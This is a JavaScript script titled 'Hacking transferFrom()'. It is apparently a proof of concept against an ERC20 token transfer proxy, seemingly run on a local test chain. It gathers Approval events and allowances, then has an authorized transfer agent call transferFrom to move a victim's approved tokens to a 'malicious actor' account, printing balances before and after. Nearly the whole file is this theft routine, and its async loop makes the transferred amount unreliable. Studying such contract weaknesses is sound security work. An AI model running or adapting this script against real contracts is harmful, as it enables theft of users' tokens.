//Hacking transferFrom()
/**
 * Steps:
 * 1. Get all ethereum accounts (web3.eth.getAccounts())
 * 2. Check balance of each account (erc20TokenInstance.balanceOf(address))
 *      2.1 Select those accounts , that have token balance > 0
 * 3. For each account having balance > 0
 *      3.1 Check Approval event where,
 *          3.1.1 Owner is account having balance > 0
 *              3.1.1.1 If yes, then get the owner & spender from Approval event
 *              Make a list of such owners and spenders
 * 4. From the above list: check for allowance(owner, spender)
 *
 * From TokenTransferProxy.sol
 * 1. Get all authorized agents: getAuthorizedTransferAgents()
 * 2. Invoke transferFrom() from any one of the authorized transfer agents
 *      2.1 Parameters of transferFrom
 *      _token: erc20Token contract address
 *      _from: TokenTransferProxy.sol contract address
 *      _to: malicious actor account address
 *      _amount: the value from allowance
 *
 *      Thus, theoretically, it seems, transferFrom() is hackable, let's see for the code part and actual working.
 * */
/**
 * Created by Balaji on 02/11/18.
 */
const tokenTransferInterface = require('../tokenTransfer/index')
const web3APIs = require('./web3Apis')
const prettyJson = require('./prettyJsonOutput')

let txObject = {
    number: ''
}

let accounts
let accountsBalArray = []
let approvalEventsArray = []
let ownerSpenderArray = []
let stolenAmountToTransfer
let authAgent

//1. Get all ethereum accounts (web3.eth.getAccounts())
async function init() {
    return await web3APIs.getAccounts()
}

//2. Check balance of each account (erc20TokenInstance.balanceOf(address))
async function getBalances(printString) {
    console.log('\x1b[36m%s\x1b[0m', printString)
    accounts = await init()
    accountsBalArray = await web3APIs.getBalances(accounts)
}

// Get Approval events
async function getApprovalEvents() {
    console.log('\x1b[36m%s\x1b[0m', '\nInvoked getApprovalEvents() from hackTransferFrom:')
    let events = await tokenTransferInterface.getAllEvents()
    events.get((error, logs) => {
        if (error) {
            return prettyJson.getResponseObject(txObject, 'failure', 'Failed while getting event details', [])
        } else {
            logs.forEach((element) => {
                if (element.event === 'Approval') {
                    approvalEventsArray.push({
                        blockNumber: element.blockNumber,
                        transactionHash: element.transactionHash,
                        eventName: element.event,
                        args: {
                            owner: element.args.owner,
                            spender: element.args.spender,
                            value: element.args.value.toNumber()
                        }
                    })
                }
            })
            return prettyJson.getResponseObject(txObject, 'success', 'Approval event details are: ', approvalEventsArray)
        }
    })
}

/*
 *  3. For each account having balance > 0
 *      3.1 Check Approval event where,
 *          3.1.1 Owner is account having balance > 0
 *              3.1.1.1 If yes, then get the owner & spender from Approval event
 *              Make a list of such owners and spenders
 *
*/
async function makeOwnerSpenderList() {
    console.log('\x1b[36m%s\x1b[0m', '\nInvoked makeOwnerSpenderList() from hackTransferFrom:')
    approvalEventsArray.forEach((eventElement) => {
        if (eventElement.eventName === 'Approval') {
            ownerSpenderArray.push({
                owner: eventElement.args.owner,
                spender: eventElement.args.spender,
                spendableAmount: eventElement.args.value
            })
        }
    })
    return prettyJson.getResponseObject(txObject, 'success', 'Owner Spender List', ownerSpenderArray)
}

/*
* 4. From the above list: check for allowance(owner, spender)
 *
 * From TokenTransferProxy.sol
 * 1. Get all authorized agents: getAuthorizedTransferAgents()
 * 2. Invoke transferFrom() from any one of the authorized transfer agents
 *      2.1 Parameters of transferFrom
 *      _token: erc20Token contract address
 *      _from: TokenTransferProxy.sol contract address
 *      _to: malicious actor account address
 *      _amount: the value from allowance
 * */
async function checkAllowance(){
    console.log('\x1b[36m%s\x1b[0m', '\nInvoked checkAllowance() from hackTransferFrom:')
    let allowedValue
    ownerSpenderArray.forEach(async (element) => {
        allowedValue = await tokenTransferInterface.allowance(element.owner)
        stolenAmountToTransfer = allowedValue
    })
    return prettyJson.getResponseObject(txObject, 'success', 'Allowance values', ownerSpenderArray)
}

async function getAuthAgnt() {
    console.log('\x1b[36m%s\x1b[0m', '\nInvoked getAuthAgnt() from hackTransferFrom:')
    let agents = await tokenTransferInterface.getAuthTransferAgents()
    authAgent = agents[0]

    //Invoke transferFrom
    accounts = await  init()
    let owner = accounts[0]
    let maliciousActorAdd = accounts[9]
    console.log(owner, maliciousActorAdd, stolenAmountToTransfer, authAgent)
    await  tokenTransferInterface.transferFromOwner(owner, maliciousActorAdd, stolenAmountToTransfer, authAgent)
}

async function invokeHackTransferFromFunctions() {
    await getBalances('\nInvoked getBalances() Pre Hacking from hackTransferFrom:')
    await getApprovalEvents()
    setTimeout(async () => {
        await makeOwnerSpenderList()
        await checkAllowance()
        await  getAuthAgnt()
        await checkAllowance()
        await getBalances('\nInvoked getBalances() Post Hacking from hackTransferFrom:')
    }, 5000)
}

invokeHackTransferFromFunctions()

